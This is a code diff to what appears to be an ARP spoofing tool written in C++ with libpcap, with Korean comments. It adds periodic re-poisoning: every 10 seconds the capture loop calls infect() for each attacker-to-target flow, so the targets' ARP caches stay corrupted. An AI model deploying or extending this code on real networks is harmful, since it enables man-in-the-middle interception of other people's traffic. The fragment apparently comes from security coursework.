@@ -5,6 +5,7 @@
 #include <unistd.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
+#include <ctime>
 #include "ethhdr.h"
 #include "arphdr.h"
 
@@ -189,14 +190,25 @@ int main(int argc, char* argv[]) {
 	}
 
 	// 6. 패킷 캡처 루프
+	time_t lastInfect = time(NULL);
+	
 	while (true) {
+		// 주기적 infect (10초마다)
+		time_t now = time(NULL);
+		if (now - lastInfect >= 10) {
+			for (const Flow& flow : flows)
+				infect(pcap, attackerMac, flow);
+			printf("periodic re-infect\n");
+			lastInfect = now;
+		}
+
 		struct pcap_pkthdr* header;
 		const u_char* pkt;
 		int ret = pcap_next_ex(pcap, &header, &pkt);
 		if (ret == 0) continue;
 		if (ret == PCAP_ERROR || ret == PCAP_ERROR_BREAK) {
 			fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(pcap));
-			break; // 실패시 바로 break
+			break;
 		}
 
 		EthHdr* ethHdr = (EthHdr*)pkt;
